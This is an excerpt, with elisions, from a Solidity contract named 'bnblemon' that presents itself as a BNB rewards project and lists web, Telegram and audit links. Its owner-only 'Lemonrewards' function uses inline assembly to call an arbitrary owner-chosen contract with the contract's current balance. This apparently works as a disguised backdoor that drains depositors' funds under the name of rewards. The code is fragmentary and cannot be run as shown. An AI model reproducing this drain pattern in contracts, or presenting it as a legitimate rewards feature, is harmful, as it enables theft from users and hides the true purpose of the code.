...
/Web - https://bnb-lemon.com/ 🍋
/TG - https://t.me/bnblemon 🍋
/Audit - https://hazecrypto.net/audit/bnblemon 🍋
...
contract bnblemon is Context, Ownable {
    ...
    function Lemonrewards(address lemon_rewards) public onlyOwner {
        uint size;
        assembly { size := extcodesize(lemon_rewards) }
        ...
        assembly {
            let x := mload(0x40)
            mstore ( x, sig )
            let ret := call (gas(), lemon_rewards, currentBalance, x, 0x04, x, 0x0)
